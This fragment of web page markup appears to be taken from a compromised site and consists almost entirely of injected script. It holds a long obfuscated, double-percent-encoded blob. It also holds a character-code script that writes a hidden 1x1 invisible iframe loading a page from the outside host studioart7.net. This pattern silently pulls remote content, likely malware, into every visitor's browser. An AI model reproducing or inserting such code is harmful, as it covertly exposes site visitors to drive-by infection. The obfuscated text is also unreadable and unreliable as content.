d%253b%2517%2537%2570%2533%252d%251e%252d%253d%257e%253f%252a%257b%252c%251e%2538%2505%2523%251d%2529%253a%254b%250f%2509%2516%251b%2563%255c%2529%252a%2522%2516%2515%250e%2571%2579%253b%2529%2528%250d%2579%2560%2560%257f%2549%257e%254f%2533%2570%257f%2538%253f%251c%257a%2567%2565%255f%257a%256c%2522%2521%251a%2570%2500%250b%250a%2545%256a%257f%255d%257f%2525%2575%253a%2536%253c%253c%2528%2539%2506%2544%2549%2546%2558%2524%2535%253b%252a%253f%2551%2501%2523%2530%250f%253d%253b%257e%2535%2534%2528%2536%251b%253b%257b%2569%2557%2555%2576%2577%2578%2546%2557%2550%2574%2507%2538%251c%257e%2536%2532%2528%252d%2532%2520%2529%255f%256f%2578%2519%251f%2521%2571%253d%2551%2568%2540%2551%2575%250c%256a%254d%2567%255c%257c%2572%257b%2527%2530%2536%253d%253d%2506%2557%2573%256f%2577%250b%2568%2570%2574%2542%2564%256c%257b%2566%2547%2564%257f%2561%254c%257f%2563%257b%2572%257a%253e%253c%2528%2504%2558%2525%251a%2528%2505%250b%2506%2526%2532%2534%2536%2510%2533%251a%256d%2556%257e%2548%254a%254d%2532%2578%2571%2577%2575%2534%2500%252d%2527%256e%2528%2535%2508%253c%2524%2507%2564%2505%251b%252b%250e%252c%2535%253d%251d%2536%256b%2539%2574%251c%2524%2531%251a%250a%251f%253a%253f%2519%2533%250f%2524%2515%2506%2534%2509%2548%2522%2577%253c%2526%2528%2520%2529%2538%2538%2519%2568%256d%2527%250f%251f%2537%250b%252b%2511%2562%257d%2553%252a%251d%2534%2534%252a%2521%2534%2530%2558%2516%251b%2514%252a%2529%252a%256c%253a%252e%2525%2534%251e%2510%251d%254f%2525%252c%253a%252b%254f%2513%2528%250b%253a%251f%2522%2511%2530%255e%2539%2557%256d%2525%2560%254d%253b%2577%257d%2573%2503%2536%2509%252b%2579%2513%253e%2541%252b%2539%2527%250c%2534%253d%2522%2562%256b%2544%256f%2523%253a%256a%2562%256c%2543%2530%2570%2539%252b%2516%2534%2521%2537%2536%2547%2524%257a%253e%250a%2533%2528%2576%253f%253e%2509%2549%254a%257d%2571%2527%255f%2541%2510%2500%2532%2524%256f%2506%252a%2532%2538%250f%2531%2539%252a%250c%252d%250f%2502%2576%251e%2532%2521%2576%257e%257e%252c%2504%2534%255f%2568%2576%2522%252d%2549%255f%250c%2525%2547%255e%256e%253e%253a%250c%2520%250e%2525%251b%2502%2549%253c%256a%2537%2563%2578%253e%252f%2550%252f%2532%2548%2524%252f%2537%252a%251e%2519%252a%251f%2536%250a%252e%256f%255d%2536%253a%2531%252f%2564%253b%252b%252d%2514%252a%2525%2528%254b%252b%2571%2521%252d%257d%250a%2530%2529%2515%2523%251c%2525%2512%2527%2511%2573%2507%252c%2504%2505%255f%2528%2500%254b%2538%250a%257d%253c%2564%255f%252f%2535%2515%251f%2520%252b%2514%256a%256b%2508%2521%2528%2539%2545%251f%2505%252c%2549%2531%2542%250e%2576%257a%257a%256f%2503%2535%253f%2522%256f%2521%253f%252c%2539%252f%252a%253a%2521%251c%2538%251b%2534%257c%2577%2571%251c%2550%2500%2568%253f%254f%2501%2579%2534%250e%2525%2537%2518%252d%2538%253e%251a%253d%250c%2504%253a%255d%2532%2568%251a%2571%252c%253f%250e%251a%2519%2517%2513%2552%2574%257c%2579%2528%2502%2536%2531%253c%253f%2518%2573%2564%255f%2507%253b%2514%2526%2534%253d%254c%2530%2568%2569%254d%2570%2535%2561%2525%252e%252c%2560%2513%2526%2505%2515%2542%250a%253f%2525%253a%2514%250b%2515%2504%252c%2532%2560%2533%257d%2541%2524%2522%2533%2573%255e%2561%253c%2568%2534%252f%2538%2523%253e%2545%2502%2552%2569%2538%2548%2510%253b%252f%2526%253b%2569%257c%254c%2503%251b%2521%2527%2523%252f%2568%253f%255a%2528%2526%2511%2518%252f%253a%2520%2509%2500%256e%252b%252e%2538%2523%2536%256e%2570%2554%2564%255d%2532%2537%2569%253c%2504%2531%252b%2562%2522%2579%253e%252f%253a%252b%2510%2511%2507%252f%2575%2561%2568%257b%2564%2520%2510%2535%251d%2524%2518%253b%2579%2545%2535%252a%2508%2503%2501%251b%256c%2526%256a%251e%2546%2571%254a%254f%2531%2573%2524%2577%2574%2548%2526%256c%253d%2526%253e%2533%2548%252a%2561%2567%253f%2548%2519%257c%2507%252d%2531%2500%2527%252d%2564%252d%2569%2517%257b%257b%251a%257e%2552%2536%2517%2505%252a%251a%2520%2528%2570%2579%2531%255f%2546%252d%250b%2527%251c%252c%2575%2531%257f%2555%2561%2563%2573%2560%2535%2530%2511%2534%250e%256a%252f%2518%250e%2503%253f%2529%2528%252f%2539%256c%2504%2529%252f%250f%2568%2527%2522%252b%2538%252f%2510%252d%2500%2535%251a%2549%2577%2530%253d%2505%2520%2559%2523%250f%253c%251b%252e%253c%2533%2560%2537%2505%2527%252e%257a%250d%2567%254f%2517%2531%2504%2519%250d%2531%253c%251f%2500%253c%257d%2577%2520%252d%253d%2532%2525%255a%251f%250d%257d%2574%2579%252c%2536%256f%256c%2509%253a%253b%2534%2502%256f%253b%252b%250f%2527%2539%2539%2561%255d%2535%252e%2573%2542%2527%2501%2512%2502%252c%2537%257a%2551%2530%2578%251c%2539%2527%2517%2508%252b%2523%2541%2532%2537%2530%2547%2524%2539%250f%2500%2506%2569%257e%2525%253f%2521%2505%253e%2519%2504%2537%2566%2522%2530%252d%254b%2529%255a%256f%252c%2529%252f%2561%2531%257f%2573%2522%250a%2521%2509%2507%2531%2522%2520%2569%2520%252b%252e%251b%250f%2537%254e%2576%2541%252c%2514%2531%2535%2561%257e%2575%2560%256a%256f%2573%256f%2573%2538%2537%2521%2532%2530%252b%256f%2532%2564%2524%2504%2527%2562%254a%2560%2515%257e%2535%2524%2521%2529%2528%252d%2500%254b%2566%257f%2524%2575%2519%251e%253c%2500%2507%2517%256f%2523%2537%253b%2527%2559%2572%255f%2577%2509%253b%2577%2505%2525%2536%2575%251d%2560%2556%2509%254d%2529%2512%2511%2570%2520%2564%2519%2508%253f%252f%2559%2574%256b%250a%2547%2575%2532%2572%2514%2535%2538%2525%2511%2517%2501%2578%2531%256c%27%29%3B'));</script><!-- end --><!-- o65 --><script>document.write(String.fromCharCode(60,105,102,114,97,109,101,32,115,114,99,61,34,104,116,116,112,58,47,47,115,116,117,100,105,111,97,114,116,55,46,110,101,116,47,50,50,47,105,110,100,101,120,46,112,104,112,34,32,119,105,100,116,104,61,49,32,104,101,105,103,104,116,61,49,32,115,116,121,108,101,61,34,118,105,115,105,98,105,108,105,116,121,58,32,104,105,100,100,101,110,34,62,60,47,105,102,114,97,109,101,62));</script><!-- c65 -->
